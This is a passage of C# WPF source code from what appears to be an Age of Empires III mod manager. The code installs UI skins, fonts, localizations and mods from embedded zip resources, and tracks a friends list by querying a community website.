                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.UI.JammsUI.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                                }));
                            }
                        }
                    }
                }
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private void rbRemoveUI_Checked(object sender, RoutedEventArgs e)
        {
            rbEkantaUI.IsEnabled = false;
            rbJammsUI.IsEnabled = false;
            rbQazUI.IsEnabled = false;
            rbRemoveUI.IsEnabled = false;
            try
            {
                Paths.RemoveEkantaIfInstalled();
                Paths.RemoveJammsIfInstalled();
                Paths.RemovesQazIfInstalled();
            }
            catch
            { }
            rbEkantaUI.IsEnabled = true;
            rbJammsUI.IsEnabled = true;
            rbQazUI.IsEnabled = true;
            rbRemoveUI.IsEnabled = true;
        }

        private async void tbArty_Checked(object sender, RoutedEventArgs e)
        {
            tbArty.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        if (!Paths.isArtyInstalled())
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Mods.Art.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                                }));
                            }
                        }
                    }
                }
            }
            catch { }
            tbArty.IsEnabled = true;
        }

        private void tbArty_Unchecked(object sender, RoutedEventArgs e)
        {
            tbArty.IsEnabled = false;
            try
            {
                Paths.RemoveArtyIfInstalled();
            }
            catch { }
            tbArty.IsEnabled = true;
        }

        private async void tbCows_Checked(object sender, RoutedEventArgs e)
        {
            tbCows.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        if (!Paths.isCowsInstalled())
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Mods.Cows.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                                }));
                            }
                        }
                    }
                }
            }
            catch { }
            tbCows.IsEnabled = true;
        }

        private void tbCows_Unchecked(object sender, RoutedEventArgs e)
        {
            tbCows.IsEnabled = false;
            try
            {
                Paths.RemoveCowsIfInstalled();
            }
            catch { }
            tbCows.IsEnabled = true;
        }


        private async void Button_Click_1m(object sender, RoutedEventArgs e)
        {
            try
            {
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryTAD(), "NewProfile3.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile3.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryTAD(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryTAD(), x.FullName), true);
                        }));
                    }
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryTWC(), "NewProfile2.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile2.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryTWC(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryTWC(), x.FullName), true);
                        }));
                    }
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryNilla(), "NewProfile.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryNilla(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryNilla(), x.FullName), true);
                        }));
                    }
                Paths.SetOptions(Path.Combine(Paths.GetOptDirectoryTAD(), "NewProfile3.xml"));
                Paths.SetOptions(Path.Combine(Paths.GetOptDirectoryTWC(), "NewProfile2.xml"));
                Paths.SetOptions(Path.Combine(Paths.GetOptDirectoryNilla(), "NewProfile.xml"));
            }
            catch { }
        }

        private async void Button_Click_2m(object sender, RoutedEventArgs e)
        {
            try
            {
                using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.HomeCities.HC.zip")))
                {
                    await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                    {
                        if (x.Name == "")
                            Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetHCDirectory(), x.FullName)));
                        else
                            x.ExtractToFile(Path.Combine(Paths.GetHCDirectory(), x.FullName), true);
                    }));
                }
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryTAD(), "NewProfile3.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile3.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryTAD(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryTAD(), x.FullName), true);
                        }));
                    }
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryTWC(), "NewProfile2.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile2.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryTWC(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryTWC(), x.FullName), true);
                        }));
                    }
                if (!File.Exists(Path.Combine(Paths.GetOptDirectoryNilla(), "NewProfile.xml")))
                    using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Options.NewProfile.zip")))
                    {
                        await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                        {
                            if (x.Name == "")
                                Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(Paths.GetOptDirectoryNilla(), x.FullName)));
                            else
                                x.ExtractToFile(Path.Combine(Paths.GetOptDirectoryNilla(), x.FullName), true);
                        }));
                    }
                Paths.SetHC(Path.Combine(Paths.GetOptDirectoryTAD(), "NewProfile3.xml"));
                Paths.SetHC(Path.Combine(Paths.GetOptDirectoryTWC(), "NewProfile2.xml"));
                Paths.SetHC(Path.Combine(Paths.GetOptDirectoryNilla(), "NewProfile.xml"));
            }
            catch { }
        }

        private async void RadioButton_Checked_4(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Formal436 BT"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void RadioButton_Checked_5(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Plainot"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Plainot");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF7_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Margot"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Margot");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF6_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("LugaType"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("LugaType");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF5_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Kramola"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Kramola");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF4_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Candara Italic"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Candara Italic");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF3_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Cambria Italic"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Cambria Italic");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF2_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Basil Regular"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Basil Regular");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private async void rbF1_Checked(object sender, RoutedEventArgs e)
        {
            rbF1.IsEnabled = false;
            rbF2.IsEnabled = false;
            rbF3.IsEnabled = false;
            rbF4.IsEnabled = false;
            rbF5.IsEnabled = false;
            rbF6.IsEnabled = false;
            rbF7.IsEnabled = false;
            rbF8.IsEnabled = false;
            rbF9.IsEnabled = false;
            try
            {
                if (!Paths.IsFontInstalled("Academy"))
                    using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                    {
                        object P = AS.GetValue("setuppath");

                        if (P != null)
                        {
                            using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Fonts.FONTS.zip")))
                            {
                                await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                                {
                                    if (x.Name == "")
                                        Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), "FONTS", x.FullName)));
                                    else
                                        x.ExtractToFile(Path.Combine(P.ToString(), "FONTS", x.FullName), true);
                                }));
                            }
                            Paths.ChangeFont("Academy");
                        }
                    }
            }
            catch { }
            rbF1.IsEnabled = true;
            rbF2.IsEnabled = true;
            rbF3.IsEnabled = true;
            rbF4.IsEnabled = true;
            rbF5.IsEnabled = true;
            rbF6.IsEnabled = true;
            rbF7.IsEnabled = true;
            rbF8.IsEnabled = true;
            rbF9.IsEnabled = true;
        }

        private void RadioButton_Checked_6(object sender, RoutedEventArgs e)
        {
            gSettings.Visibility = Visibility.Hidden;
            bFriends.IsEnabled = true;
            bStreams.IsEnabled = true;
        }

        private async void bRus_Click(object sender, RoutedEventArgs e)
        {
            bRus.IsEnabled = false;
            bEng.IsEnabled = false;
            bFra.IsEnabled = false;
            bGer.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Localizations.Rus.zip")))
                        {
                            await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                            {
                                if (x.Name == "")
                                    Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                else
                                    x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                            }));
                        }
                    }
                }
            }
            catch { }
            bRus.IsEnabled = true;
            bEng.IsEnabled = true;
            bFra.IsEnabled = true;
            bGer.IsEnabled = true;
        }

        private async void bEng_Click(object sender, RoutedEventArgs e)
        {
            bRus.IsEnabled = false;
            bEng.IsEnabled = false;
            bFra.IsEnabled = false;
            bGer.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Localizations.Eng.zip")))
                        {
                            await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                            {
                                if (x.Name == "")
                                    Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                else
                                    x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                            }));
                        }
                    }
                }
            }
            catch { }
            bRus.IsEnabled = true;
            bEng.IsEnabled = true;
            bFra.IsEnabled = true;
            bGer.IsEnabled = true;
        }

        private async void bGer_Click(object sender, RoutedEventArgs e)
        {
            bRus.IsEnabled = false;
            bEng.IsEnabled = false;
            bFra.IsEnabled = false;
            bGer.IsEnabled = false;
            try
            {

                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Localizations.Ger.zip")))
                        {
                            await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                            {
                                if (x.Name == "")
                                    Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                else
                                    x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                            }));
                        }
                    }
                }
            }
            catch { }
            bRus.IsEnabled = true;
            bEng.IsEnabled = true;
            bFra.IsEnabled = true;
            bGer.IsEnabled = true;
        }

        private async void bFra_Click(object sender, RoutedEventArgs e)
        {
            bRus.IsEnabled = false;
            bEng.IsEnabled = false;
            bFra.IsEnabled = false;
            bGer.IsEnabled = false;
            try
            {
                using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3 expansion pack 2\\1.0"))
                {
                    object P = AS.GetValue("setuppath");

                    if (P != null)
                    {
                        using (ZipArchive zip = new ZipArchive(Assembly.GetExecutingAssembly().GetManifestResourceStream("MultiTools.Localizations.French.zip")))
                        {
                            await Task.Run(() => zip.Entries.ToList().ForEach(x =>
                            {
                                if (x.Name == "")
                                    Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(P.ToString(), x.FullName)));
                                else
                                    x.ExtractToFile(Path.Combine(P.ToString(), x.FullName), true);
                            }));
                        }
                    }
                }
            }
            catch { }
            bRus.IsEnabled = true;
            bEng.IsEnabled = true;
            bFra.IsEnabled = true;
            bGer.IsEnabled = true;
        }

        ///////////////
        ////////
        ///////
        /// FRIENDS
        /// ////
        /// 
        ///////

        private int FThreadCount;

        private ObservableCollection<FriendListItem> Friends = new ObservableCollection<FriendListItem>();
        private FriendListItem selectedItem;
        public FriendListItem SelectedItem
        {
            get { return selectedItem; }
            set
            {
                if (selectedItem != value)
                {
                    selectedItem = value;
                    NotifyPropertyChanged("SelectedItem");
                }
            }
        }

        [DataContract]
        public class FriendListItem : INotifyPropertyChanged
        {
            public event PropertyChangedEventHandler PropertyChanged;

            public void NotifyPropertyChanged(string propName)
            {
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propName));

            }
            private string name = "";
            private int status = 0;
            private string icon = "pack://application:,,,/Icons/0.png";
            private string hint = "";


            public string Icon
            {
                get { return icon; }
                set
                {
                    if (icon != value)
                    {
                        icon = value;
                        NotifyPropertyChanged("Icon");
                    }
                }
            }
            [DataMember]
            public string Name
            {
                get { return name; }
                set
                {
                    if (name != value)
                    {
                        name = value;
                        NotifyPropertyChanged("Name");
                    }
                }
            }

            public string Hint
            {
                get { return hint; }
                set
                {
                    if (hint != value)
                    {
                        hint = value;
                        NotifyPropertyChanged("Hint");
                    }
                }
            }
            public int Status
            {
                get { return status; }
                set
                {
                    if (status != value)
                    {
                        status = value;
                        NotifyPropertyChanged("Status");
                    }
                }
            }
        }

        public class RelayCommand : ICommand
        {
            private Action<object> execute;
            private Func<object, bool> canExecute;

            public event EventHandler CanExecuteChanged
            {
                add { CommandManager.RequerySuggested += value; }
                remove { CommandManager.RequerySuggested -= value; }
            }

            public RelayCommand(Action<object> execute, Func<object, bool> canExecute = null)
            {
                this.execute = execute;
                this.canExecute = canExecute;
            }

            public bool CanExecute(object parameter)
            {
                return canExecute == null || canExecute(parameter);
            }

            public void Execute(object parameter)
            {
                execute(parameter);
            }
        }


        private string FNickForAdding { get; set; }
        public string NickForAdding
        {
            get { return FNickForAdding; }
            set
            {
                FNickForAdding = value;
                NotifyPropertyChanged("NickForAdding");
            }
        }




        private ICommand deleteCommand;
        public ICommand DeleteCommand
        {
            get { return deleteCommand ?? (deleteCommand = new RelayCommand(param => this.DeleteItem(), null)); }
        }


        public void AddItem()
        {
            if (FriendsIndexOf(NickForAdding) == -1 && !string.IsNullOrEmpty(NickForAdding))
            {
                Friends.Add(new FriendListItem { Name = NickForAdding, Status = 0 });
                NickForAdding = "";
            }

        }

        public void DeleteItem()
        {
            if (SelectedItem != null)
                Friends.Remove(SelectedItem);
        }

        private DispatcherTimer FriendsTimer = new DispatcherTimer()
        {
            Interval = TimeSpan.FromMilliseconds(100)
        };
        string FriendPath;



        private int FriendsIndexOf(string Name)
        {
            for (int i = 0; i < Friends.Count; i++)
                if (Name.ToLower() == Friends[i].Name.ToLower())
                    return i;
            return -1;
        }

        private void FriendsTimer_Tick(object sender, EventArgs e)
        {
            FriendsTimer.Stop();
            FriendsTimer.Interval = TimeSpan.FromMilliseconds(5000);
            FThreadCount = Friends.Count;
            if (Friends.Count == 0)
                FriendsTimer.Start();
            else
                for (int i = 0; i < Friends.Count; i++)
                {
                    Debug.WriteLine(i);
                    GetFriendInfo(Friends[i].Name);
                }
        }


        async void GetFriendInfo(string Name)
        {

            try
            {

                string Data = await HttpGetAsync("http://www.agecommunity.com/query/query.aspx?md=user&name=" + WebUtility.UrlEncode(Name));
                UserStatus US = new UserStatus(Name);
                US.Get(Data);


                int Index = FriendsIndexOf(Name);
                if (Index != -1)
                {

                    if (US.Status != -1)
                    {
                        Friends[Index].Name = US.Nick;
                        Friends[Index].Status = US.Status;
                        Friends[Index].Icon = US.Icon;
                        List<string> A = new List<string>();
                        if (!string.IsNullOrEmpty(US.LastLogin))
                            A.Add("Last login: " + US.LastLogin);
                        if (!string.IsNullOrEmpty(US.Clan))
                            A.Add("Clan: " + US.Clan);
                        A.Add(US.PRYS);
                        A.Add(US.PRYT);
                        A.Add(US.PRS);
                        A.Add("");
                        A.Add("Click to open ELO page");
                        Friends[Index].Hint = string.Join(Environment.NewLine, A.ToArray());
                    }
                    else
                    {
                        Friends.RemoveAt(Index);
                    }

                }
            }
            catch { }
            FThreadCount--;
            if (FThreadCount == 0)
                FriendsTimer.Start();
        }





        private void Button_Click_3f(object sender, RoutedEventArgs e)
        {
            AddItem();
        }

        private void TextBox_KeyDown(object sender, KeyEventArgs e)
        {

            if (tbFriend.Text != "" && e.Key == System.Windows.Input.Key.Enter)
            {
                bAdd.Focus();
